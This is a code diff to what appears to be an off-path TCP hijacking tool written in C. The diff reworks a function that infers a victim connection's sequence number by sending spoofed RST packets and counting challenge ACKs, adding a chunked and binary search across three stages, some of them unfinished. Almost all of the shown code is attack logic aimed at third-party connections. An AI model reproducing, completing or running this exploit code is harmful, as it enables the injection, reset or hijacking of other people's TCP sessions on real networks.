@@ -536,7 +536,7 @@ int sync_time_with_remote(void)
 
 
 /*
- * build a test schedule based on the start end end range
+ * build a test schedule based on the start and end of a range
  */
 chunk_t *build_schedule(u_long start, u_long end, int *pnchunks)
 {
@@ -561,6 +561,42 @@ chunk_t *build_schedule(u_long start, u_long end, int *pnchunks)
 		schedule[i].end = start + ((i + 1) * chunk_sz);
 		if (schedule[i].end > end)
 			schedule[i].end = end;
+	}
+
+	*pnchunks = nchunks;
+	return schedule;
+}
+
+
+/*
+ * build a test schedule based on the start and end of a range (reverse order)
+ */
+chunk_t *build_schedule_reverse(u_long start, u_long end, int *pnchunks)
+{
+	int i, j, num, nchunks, chunk_sz = PACKETS_PER_ROUND;
+	chunk_t *schedule = NULL;
+
+	num = end - start;
+	if (num <= chunk_sz) {
+		fprintf(stderr, "[!] build_schedule_reverse: invalid range (too small)!\n");
+		return NULL;
+	}
+	nchunks = (num / chunk_sz) + 1;
+
+	schedule = (chunk_t *)malloc(sizeof(chunk_t) * nchunks);
+	if (!schedule) {
+		perror("[!] malloc");
+		return NULL;
+	}
+
+	// XXX: TODO: fill the schedule properly, starting from the end - chunksz
+	j = nchunks - 1;
+	for (i = 0; i < nchunks; i++) {
+		schedule[i].start = start + (j * chunk_sz);
+		schedule[i].end = start + ((j + 1) * chunk_sz);
+		if (schedule[i].end > end)
+			schedule[i].end = end;
+		j--;
 	}
 
 	*pnchunks = nchunks;
@@ -767,43 +803,111 @@ int infer_four_tuple(void)
  *
  * try to determine the victim's current sequence number
  *
- * we do this using an optimized approach breaking the search space
- * into blocks based on the window size.
+ * this stage has 3 steps:
+ *
+ * 1. determine a block of windows containing the sequence number - step:0
+ *    we do this using an optimized approach breaking the search space
+ *    into blocks based on the window size.
+ * 2. figure out which of the bins precisely the sequence number is in - step:1
+ *    we use a binary search for this.
+ * 3. figure out the exact sequence number - step:2,3
+ *    we used a hybrid (chunk and binary) search for this step.
  */
 int infer_sequence_number(void)
 {
 	struct timeval round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.conn_spoof);
+	int step = -1;
+	/* printing status */
+	u_long pr_start, pr_end, pkts_sent;
+	/* chunk-based search vars */
+	chunk_t *sched = NULL;
+	int nchunks, ci = 0;
+	/* binary search vars */
+	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
+
 	uint32_t seq_nblocks = UINT32_MAX / g_ctx.winsz;
 	uint32_t seq_block = 0, seq_last_block = 0;
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
 
-		/* remember which block we started with */
-		seq_last_block = seq_block;
-
-		/* send sequence number guesses with a cap on both time and number of
-		 * guesses...
-		 */
-		do {
-			/* meh. we have to recalculate the TCP checksum to alter the sequence number */
-			spoof->seq = seq_block * g_ctx.winsz;
-			if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+		/* initialize whatever is needed */
+		if (step == -1) {
+			/* allocate a schedule for testing sequence blocks
+			 * NOTE: the values in the schedule are actually block numbers
+			 */
+			sched = build_schedule(0, UINT32_MAX / g_ctx.winsz, &nchunks);
+			if (!sched)
 				return 0;
 
-			/* limit the amount of time we try to send guesses */
-			gettimeofday(&now, NULL);
-			timersub(&now, &round_start, &diff);
+			step = 0;
+			/* further stages will launch as things progress */
+		}
 
-			seq_block++;
-			if (seq_block == seq_nblocks)
-				break;
-			if (seq_block - seq_last_block >= 50000)
-				break;
-		} while (diff.tv_usec < 500000);
+		/* send packets depending on the step we're in */
+		if (step == 0) {
+			u_long seq_block;
 
-		printf("[*] seq-infer: spoofed %d RSTs in %lu %lu\n", (int)(seq_block - seq_last_block), diff.tv_sec, diff.tv_usec);
+			/* set these for printing status */
+			pr_start = sched[ci].start * g_ctx.winsz;
+			pr_end = sched[ci].end * g_ctx.winsz;
+
+			/* send em! */
+			pkts_sent = 0;
+			for (seq_block = sched[ci].start; seq_block < sched[ci].end; seq_block++) {
+				spoof->seq = seq_block * g_ctx.winsz;
+				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+					return 0;
+				usleep(PACKET_DELAY);
+				pkts_sent++;
+			}
+			/* we'll do maintenance after we check the results */
+		} else if (step == 1) {
+			u_long seq_block;
+
+			/* select a new mid */
+			bs_mid = (bs_start + bs_end) / 2;
+
+			/* set these for printing status */
+			pr_start = bs_mid * g_ctx.winsz;
+			pr_end = bs_end * g_ctx.winsz;
+
+			/* send em! */
+			pkts_sent = 0;
+			for (seq_block = bs_mid; seq_block < bs_end; seq_block++) {
+				spoof->seq = seq_block * g_ctx.winsz;
+				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+					return 0;
+				usleep(PACKET_DELAY);
+				pkts_sent++;
+			}
+			/* we'll do maintenance after we check the results */
+		} else if (step == 2) {
+			u_long seq_guess;
+
+			/* set these for printing status */
+			pr_start = sched[ci].end;
+			pr_end = sched[ci].start;
+
+			/* send em! */
+			pkts_sent = 0;
+			for (seq_guess = pr_start; seq_guess > pr_end; seq_guess--) {
+				spoof->seq = seq_guess;
+				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+					return 0;
+				usleep(PACKET_DELAY);
+				pkts_sent++;
+			}
+			/* we'll do maintenance after we check the results */
+		} else if (step == 3) {
+		}
+
+#ifdef DEBUG_SEQ_INFER_SPOOF_SEND
+		gettimeofday(&now, NULL);
+		timersub(&now, &round_start, &diff);
+		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent, diff.tv_sec, diff.tv_usec);
+#endif
 
 		/* send 100 RSTs */
 		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
@@ -812,15 +916,87 @@ int infer_sequence_number(void)
 		/* get the number of challenge ACKs within this second */
 		wait_until("seq-infer recv", &round_start, 1, 0);
 
-		printf("[*] seq-infer: guessed seqs [%lu - %lu): %3d challenge ACKs - %s\n",
-				(u_long)seq_last_block * g_ctx.winsz, (u_long)seq_block * g_ctx.winsz,
-				g_chack_cnt, g_chack_cnt == 99 ? "OK" : "NO");
+		printf("[*] seq-infer: guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
+				pr_start, pr_end, pkts_sent, g_chack_cnt);
+
+		/* adjust the search based on the results and mode */
+		if (g_chack_cnt == 100) {
+			if (step == 0) {
+				ci++;
+				if (ci == nchunks) {
+					printf("[!] Exhausted seq window search...\n");
+					return 0;
+				}
+			} else if (step == 1) {
+				if (bs_start >= bs_end) {
+					/* FAIL! */
+					printf("[!] Exhausted seq window binary search...\n");
+					/* go back to the beginning of the schedule?? */
+					return 0;
+				} else {
+					/* adjust range */
+					bs_end = bs_mid;
+				}
+			} else if (step == 2) {
+				ci++;
+				if (ci == nchunks) {
+					printf("[!] Exhausted sequence number search (1)...\n");
+					return 0;
+				}
+			} else if (step == 3) {
+			}
+		} else if (g_chack_cnt < 100) {
+			// XXX: TODO: adjust winsz if g_chack_cnt < 99?
+			if (step == 0) {
+				/* figure out which chunk exactly! */
+				bs_start = sched[ci].start;
+				bs_end = sched[ci].end;
+				printf("[*] Narrowed sequence (1) to %lu - %lu!\n",
+						bs_start * g_ctx.winsz,
+						(bs_end * g_ctx.winsz) + g_ctx.winsz);
+
+				/* reset the schedule */
+				free(sched);
+				sched = NULL;
+				nchunks = 0;
+
+				/* proceed to the next step */
+				step = 1;
+			} else if (step == 1) {
+				/* if we only sent one guess this time, we won! */
+				if (pkts_sent == 1) {
+					u_long seq_block = bs_mid * g_ctx.winsz;
+
+					printf("[*] Narrowed sequence (2) to: %lu - %lu\n",
+							seq_block, seq_block + g_ctx.winsz);
+
+					/* build a schedule working from right to left */
+					sched = build_schedule_reverse(seq_block - g_ctx.winsz, seq_block + g_ctx.winsz, &nchunks);
+					if (!sched)
+						return 0;
+					ci = 0;
+
+					/* proceed to the next step */
+					step = 2;
+				}
+				else
+					/* adjust range */
+					bs_start = bs_mid;
+			} else if (step == 2) {
+				ci++;
+				if (ci == nchunks) {
+					printf("[!] Exhausted sequence number search (2)...\n");
+					return 0;
+				}
+			} else if (step == 3) {
+			}
+		}
+		else {
+			// XXX: TODO: scale number of guesses per round based on feedback
+			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+		}
 
 		g_chack_cnt = 0;
-
-		/* did we finish? */
-		if (seq_block == seq_nblocks)
-			break;
 	}
 
 	/* fail! */
